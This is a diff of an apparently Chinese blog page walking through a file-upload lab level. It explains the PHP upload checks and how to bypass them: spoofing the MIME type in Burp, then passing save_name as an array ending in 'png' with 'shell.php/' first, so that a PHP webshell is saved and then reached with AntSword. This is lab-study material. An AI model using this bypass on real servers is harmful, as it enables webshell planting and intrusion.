+</span></span></code></pre></div><p>我们接着一块块来看源码中的审核机制以及我们对应的绕过 <!-- raw HTML omitted --></p>
 <p>检查 <code>MIME</code>,因此我们需要在Burp中修改 <code>MIME</code> 类型 <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$allow_type</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;image/jpeg&#39;</span><span class="p">,</span><span class="s1">&#39;image/png&#39;</span><span class="p">,</span><span class="s1">&#39;image/gif&#39;</span><span class="p">);</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$allow_type</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;image/jpeg&#39;</span><span class="p">,</span><span class="s1">&#39;image/png&#39;</span><span class="p">,</span><span class="s1">&#39;image/gif&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">],</span><span class="nv">$allow_type</span><span class="p">)){</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;禁止上传该类型文件!&#34;</span><span class="p">;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>检查我们提交的 <code>save_name</code> 字符串是否为空，有内容的话使用我们自定义的文件保存名，接着检查是否为数组，如果不是的话就要使用 <code>explode()</code> 方法将内容用 <code>‘.’</code> 分隔为数组（感觉和其他语言中的 <code>split()</code> 方法很像） <!-- raw HTML omitted --></p>
+</span></span></code></pre></div><p>检查我们提交的 <code>save_name</code> 字符串是否为空，有内容的话使用我们自定义的文件保存名，接着检查是否为数组，如果不是的话就要使用 <code>explode()</code> 方法将内容用 <code>‘.’</code> 分隔为数组（感觉和其他语言中的 <code>split()</code> 方法很像） <!-- raw HTML omitted --></p>
 <dl>
 <dt>explode()</dt>
 <dd><ul>
@@ -1235,21 +845,11 @@ jpg_payload</a>  <!-- raw HTML omitted --></p>
 </dd>
 </dl>
 <!-- raw HTML omitted -->
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save_name&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save_name&#39;</span><span class="p">];</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save_name&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;save_name&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>接着取出数组最后一个元素进行后缀名校验 <!-- raw HTML omitted --></p>
+</span></span></code></pre></div><p>接着取出数组最后一个元素进行后缀名校验 <!-- raw HTML omitted --></p>
 <dl>
 <dt>end()</dt>
 <dd><ul>
@@ -1259,32 +859,14 @@ jpg_payload</a>  <!-- raw HTML omitted --></p>
 </dd>
 </dl>
 <!-- raw HTML omitted -->
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$ext</span> <span class="o">=</span> <span class="nx">end</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$ext</span> <span class="o">=</span> <span class="nx">end</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">       <span class="nv">$allow_suffix</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span><span class="s1">&#39;png&#39;</span><span class="p">,</span><span class="s1">&#39;gif&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nv">$allow_suffix</span><span class="p">))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">           <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;禁止上传该后缀文件!&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">       <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>我们可以通过在 <code>save_name</code> 这个变量处传入一个数组，使最后一个元素为白名单的图片格式，再想办法在最后的存储的时候，让最后一个元素的内容无效就行了 <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="o">=&gt;</span><span class="s1">&#39;shell.php/&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="o">=&gt;</span><span class="s1">&#39;png&#39;</span><span class="p">]</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><dl>
+</span></span></code></pre></div><p>我们可以通过在 <code>save_name</code> 这个变量处传入一个数组，使最后一个元素为白名单的图片格式，再想办法在最后的存储的时候，让最后一个元素的内容无效就行了 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="o">=&gt;</span><span class="s1">&#39;shell.php/&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="o">=&gt;</span><span class="s1">&#39;png&#39;</span><span class="p">]</span>
+</span></span></code></pre></div><dl>
 <dt>reset()</dt>
 <dd><ul>
 <li>reset(array|object &amp;$array): mixed <!-- raw HTML omitted --></li>
@@ -1293,17 +875,9 @@ jpg_payload</a>  <!-- raw HTML omitted --></p>
 </dd>
 </dl>
 <p>最后因为这里会拼接一个 <code>'.'</code> ，因此与之前的 <code>'/'</code> 构成我们上一关提到的 <code>move_uploaded_file</code> 的漏洞，即 <code>/.</code> 末尾的内容会被忽略，即可完成绕过，上传成功 <!-- raw HTML omitted --></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">reset</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="nx">count</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">reset</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="nx">count</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><figure><img src="/ox-hugo/2022-05-03_17-43-07_screenshot.png" width="700px"/>
+</span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-03_17-43-07_screenshot.png" width="700px"/>
 </figure>
  <!-- raw HTML omitted --></p>
 <p>上传成功使用蚁剑连接成功 <!-- raw HTML omitted --></p>
